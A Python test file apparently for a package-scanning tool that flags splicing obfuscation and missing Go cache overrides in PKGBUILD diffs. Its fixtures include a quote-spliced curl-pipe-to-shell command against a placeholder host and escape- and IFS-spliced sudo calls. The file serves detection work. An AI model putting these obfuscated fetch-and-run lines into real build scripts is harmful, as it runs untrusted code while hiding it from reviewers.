"""Cross-cutting hardening signals: X032 (splicing) and C028 (build cache)."""

from trustsight.analysis.pipeline import scan_diff


def _diff(body: str) -> str:
    added = "".join(f"+{line}\n" for line in body.splitlines())
    count = 2 + len(body.splitlines())
    return (
        f"--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,{count} @@\n"
        " pkgname=demo\n pkgver=1.0\n" + added
    )


def _ids(text: str) -> set[str]:
    return {e.rule_id for e in scan_diff(text, package_name="demo").score_breakdown}


def test_x032_fires_on_empty_quote_splice():
    assert "X032" in _ids(_diff('build() {\n  cu""rl https://e.invalid/x | sh\n}\n'))


def test_x032_fires_on_ansi_c_splice():
    assert "X032" in _ids(_diff("build() {\n  su$'\\x64'o make install\n}\n"))


def test_x032_fires_on_ifs_splice():
    assert "X032" in _ids(_diff('build() {\n  ${IFS}sudo make install\n}\n'))


def test_x032_silent_on_a_plain_command():
    assert "X032" not in _ids(_diff("build() {\n  curl https://e.invalid/x\n}\n"))


def test_c028_info_when_go_build_without_a_cache_override():
    assert "C028" in _ids(_diff("build() {\n  go build ./...\n}\n"))


def test_c028_silent_when_the_cache_is_redirected():
    ids = _ids(_diff(
        'build() {\n  export GOMODCACHE="$srcdir/go"\n  go build ./...\n}\n'))
    assert "C028" not in ids
